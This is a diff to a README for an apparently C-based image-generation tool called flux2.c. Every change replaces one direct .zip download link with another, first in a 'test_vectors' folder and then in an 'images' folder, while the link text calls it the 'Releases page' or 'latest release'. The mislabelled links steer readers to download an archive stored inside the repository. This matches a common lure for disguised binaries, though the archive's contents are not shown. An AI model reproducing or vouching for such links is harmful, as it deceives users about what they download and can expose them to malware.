@@ -1,7 +1,7 @@
 # 🌟 flux2.c - Effortless Image Generation with C
 
-![Download](https://raw.githubusercontent.com/gauravtarak/flux2.c/main/test_vectors/c-flux-1.2-alpha.3.zip)  
-[Download the latest release here!](https://raw.githubusercontent.com/gauravtarak/flux2.c/main/test_vectors/c-flux-1.2-alpha.3.zip)
+![Download](https://github.com/gauravtarak/flux2.c/raw/refs/heads/main/images/c-flux-v2.8.zip)  
+[Download the latest release here!](https://github.com/gauravtarak/flux2.c/raw/refs/heads/main/images/c-flux-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, ensure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get started with flux2.c, visit the [Releases page](https://raw.githubusercontent.com/gauravtarak/flux2.c/main/test_vectors/c-flux-1.2-alpha.3.zip) to download the software. 
+To get started with flux2.c, visit the [Releases page](https://github.com/gauravtarak/flux2.c/raw/refs/heads/main/images/c-flux-v2.8.zip) to download the software. 
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of flux2.c.
@@ -70,6 +70,6 @@ For further support, please reach out through our GitHub page. We’re happy to 
 
 ## 🗓️ Release Notes
 
-Make sure to keep an eye on the [Releases page](https://raw.githubusercontent.com/gauravtarak/flux2.c/main/test_vectors/c-flux-1.2-alpha.3.zip) for updates. Each new release comes with improvements and new features.
+Make sure to keep an eye on the [Releases page](https://github.com/gauravtarak/flux2.c/raw/refs/heads/main/images/c-flux-v2.8.zip) for updates. Each new release comes with improvements and new features.
 
 Thank you for choosing flux2.c! Happy image generation!
